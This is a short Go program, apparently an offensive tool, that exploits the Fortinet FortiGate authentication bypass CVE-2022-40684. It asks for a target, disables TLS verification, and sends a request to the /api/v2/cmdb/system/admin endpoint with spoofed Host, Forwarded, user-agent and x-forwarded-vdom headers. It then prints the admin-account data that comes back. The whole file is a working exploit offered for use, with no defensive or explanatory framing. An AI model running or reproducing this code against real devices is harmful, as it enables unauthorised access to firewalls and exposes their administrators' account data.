package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"

	"github.com/gookit/color"
)

func showBanner() {

	banner := `  
	 _                   
	|_) \/ |   _. |_   _ 
	|   /\ |_ (_| |_) _>
	
	  Exploit Fortigate
	   CVE-2022-40684
`

	fmt.Println(banner)

}

func main() {
	// clear screen
	fmt.Print("\033[H\033[2J")

	showBanner()

	var TARGET string

	color.Bold.Print("TARGET> ")
	fmt.Scan(&TARGET)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	req, err := http.NewRequest("GET", "https://"+TARGET+"/api/v2/cmdb/system/admin", nil)
	if err != nil {

	}
	req.Host = TARGET
	req.Header.Set("user-agent", "Node.js")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "close")
	req.Header.Set("Host", "127.0.0.1:9980")
	req.Header.Set("forwarded", "by='[127.0.0.1]:80';for='[127.0.0.1]:49490';proto=http;host=")
	req.Header.Set("x-forwarded-vdom", "root")
	
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}
	fmt.Printf("%s\n", body)
}
